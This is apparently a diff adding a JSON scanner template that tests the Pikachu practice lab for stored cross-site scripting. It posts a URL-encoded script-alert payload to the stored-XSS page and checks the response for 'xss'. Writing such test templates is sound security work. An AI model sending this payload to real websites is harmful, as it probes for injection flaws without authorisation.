@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "存储型XSS",
+    "version": "",
+    "comment": "存储型XSS",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xss/xss_stored.php",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": "message=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&submit=submit"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "xss"
+            }
+        }
+    }
+}
